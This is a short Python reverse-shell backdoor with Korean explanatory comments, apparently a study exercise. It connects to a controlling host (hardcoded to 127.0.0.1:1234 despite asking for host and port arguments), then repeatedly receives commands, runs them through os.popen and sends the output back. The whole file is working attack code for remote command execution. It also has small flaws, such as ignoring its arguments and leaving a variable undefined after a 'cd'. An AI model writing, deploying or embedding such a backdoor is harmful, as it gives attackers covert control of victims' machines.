#-*-coding:utf-8 -*-

import  os, socket, sys #운영체제, 소켓, 시스템

def start(): #입력 설명
    print("\n reverse_backdoor.py <host> <port>") #호스트명과 포트번호 나타냄
    exit()

#호호스트명과 포트번호를 담고 있는 객체(명령어 몇개인지)
if len(sys.argv)<3: #이름,호스트명,포트번호 3가지 중 하나라도 없을 경우
    start()

#백도어 초기과정(열린 서버에 소켓 연결)
with socket.socket() as s: #서버에 접속하는 형태
    addr=("127.0.0.1",int(1234)) #호스트명과 포트번호를 주소로 받음
    s.connect(addr) #통신 시작
    s.send(""">>""".encode()) #데이터 전송(연결되면 배너를 띄움)

#명령어를 받으면 계속 반복적으로 처리해줘야 됨
    while True:
        data=s.recv(1024).decode()
        if"q"==data: #프로그램 종료
            print("연결이 종료되었습니다.")
            exit()
        else:
            if data.startswith("cd"): #cd로 시작하는 명령어가 들어올 경우 디레고리 변경
                os.chdir(data[3:].replace('\n',''))
            else:
                result=os.popen(data).read() #프로그램이 실행되는 경우라고 생각
        result=result+"\n>>" #데이터를 열고 계속 프롬프트 실행
        s.send(result.encode())
